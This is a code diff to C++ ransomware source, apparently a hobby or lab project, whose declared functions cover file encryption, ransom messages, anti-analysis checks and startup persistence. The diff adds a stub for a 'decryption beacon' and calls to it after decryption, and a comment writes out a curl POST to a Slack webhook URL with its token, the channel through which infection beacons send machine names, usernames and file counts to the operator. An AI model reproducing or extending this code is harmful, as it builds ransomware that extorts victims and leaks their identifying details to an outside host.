@@ -105,6 +105,7 @@ bool ExcludePath(std::string checkString);
 bool Cryptor(std::string fileToEncrypt, std::string fileEncrypted, std::string key);
 bool Decryptor(std::string fileToDecrypt, std::string fileRestored, std::string key);
 void SendInfectionBeacon(DWORD dwEncryptedFileCount);
+void SendDecryptionBeacon(DWORD dwEncryptedFileCount);
 void RansomMessage(DWORD dwEncryptedFileCount);
 bool AnalysisCheck();
 void SaveStartupPersistence();
@@ -252,12 +253,18 @@ int main(int argc, char* argv[])
 			// Obfuscating the string "Not All Your Files Are Belong To You!!! :<" from analysis tools
 			// "Not All Your Files Are Belong To You!!! :<" 
 			std::cout << std::endl << strNotAllYourFilesAreBelongToYou << std::endl;
+
+			// Send network beacon to report ransom/decryption partially completed - machine is not fully cleaned
+			SendDecryptionBeacon(dwDecryptionResult);
 		}
 		else
 		{
 			// Obfuscating the string "All Your Files Are Belong To You!!! :>" from analysis tools
 			// "All Your Files Are Belong To You!!! :>" 
 			std::cout << std::endl << strAllYourFilesAreBelongToYou << std::endl;
+
+			// Send network beacon to report ransom/decryption completed - machine is successfully cleaned
+			SendDecryptionBeacon(dwDecryptionResult);
 		}
 	}
 }
@@ -337,7 +344,7 @@ void SendInfectionBeacon(DWORD dwEncryptedFileCount)
 {
 	// Sends an infection beacon to a slack channel to track infections
 	//
-	// Beacon data includes machinename, username, # files encrypted
+	// Beacon data includes machinename, username, # files encrypted, UTC time of infection event
 	
 	/*	
 	Slack App details for reporting infection status
@@ -474,6 +481,23 @@ void SendInfectionBeacon(DWORD dwEncryptedFileCount)
 	if (hRequest) WinHttpCloseHandle(hRequest);
 	if (hConnect) WinHttpCloseHandle(hConnect);
 	if (hSession) WinHttpCloseHandle(hSession);
+
+}
+
+void SendDecryptionBeacon(DWORD dwDecryptedFileCount)
+{
+	// TODO: Sends beacon to a slack channel to track infection cleaning
+	//
+	// Beacon data includes machinename, username, # files not decrypted, UTC time of cleaning event
+
+	/*
+	Slack App details for reporting infection status
+
+	curl -X POST -H 'Content-type: application/json' --data '{"text":"Hello, World!"}' https://hooks.slack.com/services/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
+
+	https://hooks.slack.com/services/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
+	*/
+
 
 }
 
